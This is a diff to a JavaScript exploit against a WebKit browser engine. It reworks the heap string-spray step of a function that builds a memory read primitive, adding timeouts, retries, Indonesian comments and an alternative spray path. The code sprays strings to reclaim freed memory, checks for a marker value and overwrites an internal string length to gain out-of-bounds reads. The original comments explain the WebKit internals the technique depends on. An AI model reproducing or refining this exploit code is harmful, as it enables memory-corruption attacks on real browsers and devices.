@@ -396,38 +396,125 @@ async function make_rdr(view) {
     const marker_offset = original_strlen - 4;
     const pad = 'B'.repeat(marker_offset);
 
-    log('start string spray');
-    while (true) {
-        for (let i = 0; i < num_strs; i++) {
-            u32[0] = i;
-            // on versions like 8.0x:
-            // * String.fromCharCode() won't create a 8-bit string. so we use
-            //   fromCodePoint() instead
-            // * Array.prototype.join() won't try to convert 16-bit strings to
-            //   8-bit
-            //
-            // given the restrictions above, we will ensure "str" is always a
-            // 8-bit string. you can check a WebKit source code (e.g. on 8.0x)
-            // to see that String.prototype.repeat() will create a 8-bit string
-            // if the repeated string's length is 1
-            //
-            // Array.prototype.join() calls JSC::JSStringJoiner::join(). it
-            // returns a plain JSString (not a JSRopeString). that means we
-            // have allocated a WTF::StringImpl with the proper size and whose
-            // string data is inlined
-            const str = [pad, String.fromCodePoint(...u8)].join('');
-            strs.push(str);
+    log('start string spray with safety measures');
+
+    // Fungsi untuk mempersiapkan string spray
+    async function prepareForStringSpray() {
+        log("Preparing for string spray...");
+
+        // Coba paksa garbage collection
+        try {
+            gc();
+            log("Garbage collection triggered");
+        } catch (e) {
+            log(`Warning: Garbage collection failed: ${e.message}`);
         }
 
-        if (view.read32(off.strimpl_inline_str) === 0x42424242) {
-            view.write32(off.strimpl_strlen, 0xffffffff);
-            break;
+        // Tambahkan delay untuk stabilitas
+        await sleep(100);
+    }
+
+    // Persiapan awal
+    await prepareForStringSpray();
+
+    // Tambahkan timeout untuk menghindari hang
+    const maxLoops = 20; // Batasi jumlah loop
+    const startTime = performance.now();
+    const timeoutMs = 10000; // 10 detik timeout
+
+    let timedOut = false;
+    const timeoutId = setTimeout(() => {
+        log("String spray timeout reached!");
+        timedOut = true;
+    }, timeoutMs);
+
+    try {
+        let loopCount = 0;
+        while (!timedOut && loopCount < maxLoops) {
+            log(`String spray loop ${loopCount + 1}/${maxLoops}`);
+
+            // Batasi jumlah string per loop
+            const batchSize = Math.min(num_strs, 100);
+            for (let i = 0; i < batchSize; i++) {
+                // Periksa timeout setiap 10 iterasi
+                if (i % 10 === 0 && timedOut) {
+                    log(`Timeout detected at iteration ${i}, stopping spray`);
+                    break;
+                }
+
+                u32[0] = i;
+                // on versions like 8.0x:
+                // * String.fromCharCode() won't create a 8-bit string. so we use
+                //   fromCodePoint() instead
+                // * Array.prototype.join() won't try to convert 16-bit strings to
+                //   8-bit
+                //
+                // given the restrictions above, we will ensure "str" is always a
+                // 8-bit string. you can check a WebKit source code (e.g. on 8.0x)
+                // to see that String.prototype.repeat() will create a 8-bit string
+                // if the repeated string's length is 1
+                //
+                // Array.prototype.join() calls JSC::JSStringJoiner::join(). it
+                // returns a plain JSString (not a JSRopeString). that means we
+                // have allocated a WTF::StringImpl with the proper size and whose
+                // string data is inlined
+                const str = [pad, String.fromCodePoint(...u8)].join('');
+                strs.push(str);
+            }
+
+            // Periksa apakah kita berhasil
+            if (view.read32(off.strimpl_inline_str) === 0x42424242) {
+                view.write32(off.strimpl_strlen, 0xffffffff);
+                log(`String spray successful on loop ${loopCount + 1}`);
+                break;
+            }
+
+            // Jika tidak berhasil, bersihkan dan coba lagi
+            log(`String spray loop ${loopCount + 1} failed, cleaning up and retrying...`);
+            strs.length = 0;
+
+            // Tambahkan delay yang meningkat dengan setiap loop
+            await prepareForStringSpray();
+            await sleep(50 * (loopCount + 1));
+
+            str_wait++;
+            loopCount++;
+
+            // Jika sudah mencapai batas loop, coba pendekatan alternatif
+            if (loopCount >= maxLoops - 1 && view.read32(off.strimpl_inline_str) !== 0x42424242) {
+                log("Trying alternative approach for string spray...");
+
+                // Pendekatan alternatif: buat string dengan ukuran yang berbeda
+                for (let i = 0; i < 200; i++) {
+                    // Variasikan ukuran string
+                    const altStr = "B".repeat(0x28 + (i % 8));
+                    strs.push(altStr);
+
+                    // Periksa setiap 10 iterasi
+                    if (i % 10 === 0 && view.read32(off.strimpl_inline_str) === 0x42424242) {
+                        view.write32(off.strimpl_strlen, 0xffffffff);
+                        log(`Alternative string spray successful at iteration ${i}`);
+                        break;
+                    }
+                }
+            }
         }
 
-        strs.length = 0;
-        gc();
-        await sleep();
-        str_wait++;
+        // Periksa apakah kita berhasil atau timeout
+        if (timedOut) {
+            log("String spray timed out!");
+            throw new Error("String spray timed out");
+        } else if (view.read32(off.strimpl_inline_str) !== 0x42424242) {
+            log("String spray failed after all attempts!");
+            throw new Error("String spray failed after all attempts");
+        }
+    } finally {
+        // Bersihkan timeout
+        clearTimeout(timeoutId);
+
+        // Log waktu yang dibutuhkan
+        const elapsedTime = performance.now() - startTime;
+        log(`String spray took ${elapsedTime.toFixed(2)}ms`);
     }
     log(`JSString reused memory at loop: ${str_wait}`);
 
